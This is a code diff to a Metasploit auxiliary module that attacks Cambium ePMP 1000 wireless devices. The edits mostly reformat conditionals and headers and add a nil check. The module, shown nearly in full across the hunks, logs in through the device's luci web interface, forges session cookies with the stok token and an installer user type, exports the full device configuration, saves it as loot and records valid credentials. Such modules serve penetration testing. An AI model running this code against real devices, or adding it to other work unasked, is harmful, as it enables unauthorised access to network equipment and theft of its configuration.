@@ -93,8 +93,14 @@ class MetasploitModule < Msf::Auxiliary
       return false
     end
 
-    if (res && res.code == 200 && res.headers['Server'] && (res.headers['Server'].include?('Cambium HTTP Server') || res.body.include?('cambiumnetworks.com')))
+    good_response = (
+      res &&
+      res.code == 200 &&
+      res.headers['Server'] &&
+      (res.headers['Server'].include?('Cambium HTTP Server') || res.body.include?('cambiumnetworks.com'))
+    )
 
+    if good_response
       get_epmp_ver = res.body.match(/"sw_version">([^<]*)/)
       epmp_ver = get_epmp_ver[1]
       print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000 version #{epmp_ver}...")
@@ -114,9 +120,12 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_cgi(
         {
-          'uri'       => '/cgi-bin/luci',
-          'method'    => 'POST',
-          'headers'   => { 'X-Requested-With' => 'XMLHttpRequest', 'Accept' => 'application/json, text/javascript, */*; q=0.01' },
+          'uri' => '/cgi-bin/luci',
+          'method' => 'POST',
+          'headers' => {
+            'X-Requested-With' => 'XMLHttpRequest',
+            'Accept' => 'application/json, text/javascript, */*; q=0.01'
+          },
           'vars_post' =>
             {
               'username' => 'dashboard',
@@ -125,17 +134,28 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
 
-      if (res && res.code == 200 && res.headers.include?('Set-Cookie') && res.headers['Set-Cookie'].include?('sysauth'))
+      good_response = (
+        res &&
+        res.code == 200 &&
+        res.headers.include?('Set-Cookie') &&
+        res.headers['Set-Cookie'].include?('sysauth')
+      )
+
+      if good_response
         sysauth_value = res.headers['Set-Cookie'].match(/((.*)[$ ])/)
 
         cookie1 = "#{sysauth_value}; " + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D"
 
         res = send_request_cgi(
           {
-            'uri'       => '/cgi-bin/luci',
-            'method'    => 'POST',
-            'cookie'    => cookie1,
-            'headers'   => { 'X-Requested-With' => 'XMLHttpRequest', 'Accept' => 'application/json, text/javascript, */*; q=0.01', 'Connection' => 'close' },
+            'uri' => '/cgi-bin/luci',
+            'method' => 'POST',
+            'cookie' => cookie1,
+            'headers' => {
+              'X-Requested-With' => 'XMLHttpRequest',
+              'Accept' => 'application/json, text/javascript, */*; q=0.01',
+              'Connection' => 'close'
+            },
             'vars_post' =>
               {
                 'username' => user,
@@ -143,10 +163,16 @@ class MetasploitModule < Msf::Auxiliary
               }
           }
         )
-
       end
 
-      if (res && res.code == 200 && res.headers.include?('Set-Cookie') && res.headers['Set-Cookie'].include?('stok='))
+      good_response = (
+        res &&
+        res.code == 200 &&
+        res.headers.include?('Set-Cookie') &&
+        res.headers['Set-Cookie'].include?('stok=')
+      )
+
+      if good_response
         print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
 
         report_cred(
@@ -158,23 +184,42 @@ class MetasploitModule < Msf::Auxiliary
         )
 
         get_stok = res.headers['Set-Cookie'].match(/stok=(.*)/)
-        stok_value = get_stok[1]
-        sysauth_value = res.headers['Set-Cookie'].match(/((.*)[$ ])/)
+        if !get_stok.nil?
+          stok_value = get_stok[1]
+          sysauth_value = res.headers['Set-Cookie'].match(/((.*)[$ ])/)
 
-        cookie2 = "#{sysauth_value}; " + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D; userType=Installer; usernameType=installer; stok=" + "#{stok_value}"
+          cookie2 = "#{sysauth_value}; " + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D; userType=Installer; usernameType=installer; stok=" + "#{stok_value}"
 
-        config_uri = '/cgi-bin/luci/;stok=' + "#{stok_value}" + '/admin/config_export?opts=json'
+          config_uri = '/cgi-bin/luci/;stok=' + "#{stok_value}" + '/admin/config_export?opts=json'
 
-        res = send_request_cgi({ 'method' => 'GET', 'uri' => config_uri, 'cookie' => cookie2, 'headers' => { 'Accept' => '*/*', 'Accept-Language' => 'en-US,en;q=0.5', 'Accept-Encoding' => 'gzip, deflate', 'X-Requested-With' => 'XMLHttpRequest', 'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8', 'Connection' => 'close' } }, 25)
+          res = send_request_cgi(
+            {
+              'method' => 'GET',
+              'uri' => config_uri,
+              'cookie' => cookie2,
+              'headers' => {
+                'Accept' => '*/*',
+                'Accept-Language' => 'en-US,en;q=0.5',
+                'Accept-Encoding' => 'gzip, deflate',
+                'X-Requested-With' => 'XMLHttpRequest',
+                'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Connection' => 'close'
+              }
+            }, 25
+          )
 
-        if res && res.code == 200 && res.body =~ /device_props/
-          print_good('++++++++++++++++++++++++++++++++++++++')
-          print_good("#{rhost}:#{rport} - dumping configuration")
-          print_good('++++++++++++++++++++++++++++++++++++++')
-          print_good("#{rhost}:#{rport} - File retrieved successfully!")
+          if res && res.code == 200 && res.body =~ /device_props/
+            vprint_status('++++++++++++++++++++++++++++++++++++++')
+            vprint_status("#{rhost}:#{rport} - dumping configuration")
+            vprint_status('++++++++++++++++++++++++++++++++++++++')
+            print_good("#{rhost}:#{rport} - File retrieved successfully!")
 
-          path = store_loot('ePMP_config', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 device config')
-          print_status("#{rhost}:#{rport} - File saved in: #{path}")
+            path = store_loot('ePMP_config', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 device config')
+            print_status("#{rhost}:#{rport} - File saved in: #{path}")
+          else
+            print_error("#{rhost}:#{rport} - Failed to retrieve configuration")
+            return
+          end
 
           # Extract ePMP version
           res = send_request_cgi(
@@ -193,9 +238,6 @@ class MetasploitModule < Msf::Auxiliary
             user: user,
             password: pass
           )
-        else
-          print_error("#{rhost}:#{rport} - Failed to retrieve configuration")
-          return
         end
       else
         print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
